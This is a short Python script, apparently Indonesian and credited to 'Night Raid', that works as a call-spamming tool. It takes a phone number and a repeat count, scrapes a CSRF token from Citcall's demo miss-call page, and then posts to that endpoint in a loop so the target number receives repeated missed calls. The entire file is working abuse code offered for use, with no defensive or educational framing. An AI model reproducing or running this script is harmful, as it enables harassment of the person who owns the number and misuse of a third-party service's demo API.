#Night Raid 

import time, re, sys
from requests import Session
s = Session()

print("Spam Call by Night Raid Reporting - toolnya delay 5detik anjir\ngunain kode 63ea slur (ex: 62xxxxx)")
try:
	no = int(input("No Telponnya slur    : "))
	jml = int(input("Mau berapa kali njir : "))
	print()
except:
	print("\n\t* Only Number *")
	sys.exit()
	
url = "https://www.citcall.com/demo/misscallapi.php"

tkn = s.get(url).text
token = re.findall(r'id="csrf_token" value="(.*?)">', tkn)[0]

headers = {
	'x-requested-with':'XMLHttpRequest'
}
data = {
'cid':no,
'trying':'0',
'csrf_token':token
}

n = 0
try:
	while n < jml:
		send = s.post(url, data=data, headers=headers).text
		time.sleep(4.8)
		if 'Sukse Coeg' in send:
			n +=1
			print(f"[{n}] Sedang dikirim ke  => {no}")
		else:
			print("\n\t* Limit coeg server penuh *")
			print("\n\t* coba lagi nanti ea slur *")
			break
except:
	print("\n\t* YNTKTS/ERROR *")
	sys.exit()